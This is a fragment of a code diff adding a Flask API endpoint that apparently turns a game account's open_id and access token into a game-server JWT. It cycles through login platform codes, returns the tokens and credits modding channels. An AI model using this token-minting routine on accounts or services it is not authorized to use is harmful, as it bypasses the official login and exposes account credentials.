+      }), 400
+  except Exception as e:
+    return jsonify({
+        "success": False,
+        "error": "INSPECT_FAILED",
+        "message": str(e)
+    }), 500
+
+  result = None
+  platform_used = None
+  for pt in [3, 8, 11, 5, 10, 2, 4, 6, 12]:
+    result = try_major_login(open_id, access_token, pt)
+    if result:
+      platform_used = pt
+      break
+
+  if not result:
+    return jsonify({
+        "success": False,
+        "error": "JWT_GENERATION_FAILED",
+        "message": "Failed to generate JWT token. Account may be unregistered or banned."
+    }), 500
+
+  jwt_token = result["token"]
+  platform_name = {
+      3: "Facebook", 4: "Guest", 5: "VK", 8: "Google",
+      10: "AppleId", 11: "X (Twitter)"
+  }.get(platform_used, "Unknown")
+
+  from datetime import timezone, timedelta
+  current_time = datetime.now(timezone.utc)
+  current_ist = current_time + timedelta(hours=5, minutes=30)
+
+  response_data = {
+      "success": True,
+      "access_token": access_token,
+      "jwt_token": jwt_token,
+      "decoded_jwt": {},
+      "user_info": {
+          "uid": str(uid),
+          "open_id": open_id,
+          "platform_type": platform_used,
+          "platform_name": platform_name,
+      },
+      "current_time": {
+          "utc": current_time.strftime("%Y-%m-%d %H:%M:%S UTC"),
+          "ist": current_ist.strftime("%Y-%m-%d %H:%M:%S IST"),
+          "timestamp": int(time.time())
+      },
+      "credits": {
+          "developer": "@XEROX_MODS",
+          "main_channel": "@SEXTYMODS",
+          "apis_channel": "@SEXTYMODS"
+      }
+  }
+
+  return jsonify(response_data)
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 8000))
-    log_info(f'Starting API server on port {port}')
-    app.run(host='0.0.0.0', port=port, debug=True)
+    port = int(os.environ.get("PORT", 8000))
+    app.run(host='0.0.0.0', port=port, debug=False)
